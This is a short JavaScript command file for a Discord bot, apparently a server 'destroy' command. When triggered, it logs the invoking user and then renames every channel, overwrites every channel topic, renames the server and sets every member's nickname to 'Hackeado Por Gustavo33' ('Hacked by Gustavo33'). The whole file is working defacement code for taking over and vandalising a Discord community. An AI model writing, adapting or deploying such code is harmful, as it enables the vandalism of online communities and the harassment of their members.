exports.run = async (client, message) => {
    console.log(`Destroy Ordernado Por ${message.author} ID: ${message.author.id}`)
    function a1(){
        client.guilds.get(message.guild.id).channels.forEach((canal) => {
            canal.setTopic("Hackeado Por Gustavo33")
            canal.setName("Hackeado Por Gustavo33")
        })
       message.guild.setName("Hackeado Por Gustavo33")
       client.guilds.get(message.guild.id).members.forEach((m) => {
           m.setNickname("Hackeado Por Gustavo33")
       })
    }
    function b1(){
    }
    function a2(){
        a1()
        //b1()
    }
    a2()
}